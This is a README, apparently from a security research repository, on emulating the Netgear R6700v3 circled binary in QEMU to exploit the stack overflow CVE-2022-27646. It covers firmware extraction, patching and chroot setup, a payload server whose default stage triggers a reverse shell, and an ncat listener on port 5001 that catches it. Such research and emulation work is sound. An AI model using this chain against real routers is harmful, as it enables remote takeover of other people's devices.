# Exploiting a Stack Buffer Overflow on the Netgear R6700v3 (CVE-2022-27646)
## 1. Setup
### 1.1 Host System
- Install the following dependencies:
  - git
  - binwalk (https://github.com/ReFirmLabs/binwalk)
- Clone the repository:
  ```
  git clone https://github.com/pdamian/netgear_r6700v3_circled.git && cd netgear_r6700v3_circled/
- Extract the R6700v3 firmware with *binwalk*:
  ```
  binwalk -e -M -C firmware/ firmware/R6700v3-V1.0.4.120_10.0.91.zip
  ```
- Copy the following files to the firmware's root filesystem:
  ```
  # Variable to the root filesystem
  export ROOTFS="$(pwd)/firmware/_R6700v3-V1.0.4.120_10.0.91.zip.extracted/_R6700v3-V1.0.4.120_10.0.91.chk.extracted/squashfs-root"
  
  # Copy pre-built gdbserver binary (or compile your own statically-linked version)
  cp firmware/bins/gdbserver $ROOTFS/gdbserver
  
  # Copy pre-built libnvram.so library (or compile your own version)
  cp firmware/bins/libnvram.so $ROOTFS/libnvram.so
  
  # Copy pre-built libcircled.so library (or compile your own version)
  cp firmware/bins/libcircled.so $ROOTFS/libcircled.so

  # Patch the circled binary
  python3 firmware/circled.patch.py $ROOTFS/bin/circled $ROOTFS/bin/circled.patched
  
  # Copy circled.sh script
  cp firmware/circled.sh $ROOTFS/circled.sh
  ```
- Copy the directories `$ROOTFS/` and `server/` to an ARMHF guest system (e.g. a *QEMU* ARMHF Debian VM).
### 1.2 ARMHF Guest System
- In the following, we assume that the variable $ROOTFS points to the copied firmware's root filesystem.
- Start the HTTP server delivering the payloads:
  ```
  # Using the default payloads triggering a reverse shell (use `--cmd` for a custom stage 0 payload)
  python3 server/circled.server.py
  ```
- In case the HTTP server was started with the default stage 0 payload (i.e. without customizing `--cmd`), listen for the reverse shell coming in on TCP port 5001:
  ```
  server/bins/ncat -l -p 5001
  ```
- Emulate the vulnerable *circled* binary:
  - Configure conservative ASLR as being used on the Netgear R6700v3:
    ```
    echo 1 | sudo tee /proc/sys/kernel/randomize_va_spac
    ```
  - Chroot into the root filesystem:
    ```
    sudo mount -t proc /proc/ $ROOTFS/proc/
    sudo mount -t sysfs /sys/ $ROOTFS/sys/
    sudo mount -o bind /dev/ $ROOTFS/dev/
    sudo chroot $ROOTFS/ /bin/sh
    ```
  - Execute the *circled* binary:
    ```
    export SHELL=/bin/sh

    # With GDB and therefore without ASRL (omit `--gdb` to run without GDB and with ASRL enabled)
    ./circled.sh --gdb
    ```
# 2. Morion Tracing
- Trace crash (`gdb-multiarch -q -x circled.gdb`)
## 2. References
- Emulating Netgear R6700v3 cicled binary:
  - https://medium.com/@INTfinity/1-1-emulating-netgear-r6700v3-circled-binary-cve-2022-27644-cve-2022-27646-part-1-5bab391c91f2
  - https://medium.com/@INTfinity/1-2-emulating-netgear-r6700v3-circled-binary-cve-2022-27644-cve-2022-27646-part-2-cf1571493117
  - https://medium.com/@INTfinity/1-3-exploiting-and-debugging-netgear-r6700v3-circled-binary-cve-2022-27644-cve-2022-27646-a80dbaf1245d
- Emulating IoT Firmware Made Easy:
  - https://boschko.ca/qemu-emulating-firmware/
- Defeating the Netgear R6700v3:
  - https://www.synacktiv.com/en/publications/pwn2own-austin-2021-defeating-the-netgear-r6700v3.html
- Chroot:
  - https://wiki.archlinux.org/title/Chroot#Using_chroot
- Ready-to-Use Cross-Compilation Toolchains:
  - https://toolchains.bootlin.com/
- NVRAM Emulator:
  - https://github.com/firmadyne/libnvram
